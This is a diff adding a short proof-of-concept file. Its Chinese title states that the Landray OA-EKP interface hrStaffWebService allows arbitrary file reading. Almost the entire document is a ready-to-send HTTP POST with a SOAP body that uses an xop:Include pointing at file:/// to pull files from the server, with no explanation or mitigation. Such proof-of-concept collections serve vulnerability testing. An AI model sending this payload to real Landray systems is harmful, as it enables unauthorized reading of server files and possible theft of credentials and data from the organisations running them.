@@ -1,0 +1,31 @@
+# 蓝凌OA-EKP系统接口hrStaffWebService存在任意文件读取漏洞
+POST /sys/webservice/hrStaffWebService HTTP/1.1
+Host: www.xwd_test.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.87 Safari/537.36 SE 2.X MetaSr 1.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate, br
+SolrAuth: L0ne1y
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypjPj0MXkAtwhgBtD
+SOAPAction: ""
+Content-Length: 593
+
+------WebKitFormBoundarypjPj0MXkAtwhgBtD
+Content-Disposition: form-data; name="1"
+
+<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="http://webservice.staff.hr.kmss.landray.com/">
+<soapenv:Header/>
+<soapenv:Body>
+    <web:getHrStaffElements>
+        <arg0>
+            <beginTimeStamp>1</beginTimeStamp>
+            <count><xop:Include 
+xmlns:xop="http://www.w3.org/2004/08/xop/include" 
+href="file:///"/></count>
+        </arg0>
+    </web:getHrStaffElements>
+</soapenv:Body>
+</soapenv:Envelope>
+------WebKitFormBoundarypjPj0MXkAtwhgBtD--
